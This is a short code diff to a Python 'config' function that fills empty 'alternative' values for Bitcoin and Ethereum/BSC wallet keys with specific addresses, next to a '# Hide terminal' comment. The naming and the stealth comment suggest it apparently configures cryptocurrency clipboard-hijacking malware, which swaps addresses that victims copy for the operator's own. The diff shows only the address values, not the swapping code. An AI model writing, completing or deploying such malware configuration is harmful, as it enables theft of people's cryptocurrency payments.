@@ -16,7 +16,7 @@ def config(name):
         return alternative
 
     if name == 'wallet-btc-1':
-        alternative = ""
+        alternative = "1GsvsvEwJDH6xexXBiQjhNAx9Lr9bZ9dD2"
         return alternative
 
     if name == 'wallet-btc-bc1':
@@ -28,7 +28,7 @@ def config(name):
         return alternative
 
     if name == 'wallet-eth&bsc':
-        alternative = ""
+        alternative = "0x6eee15156E5d2aee8BF341c4915e0960ED5B3E46"
         return alternative
 
 # Hide terminal
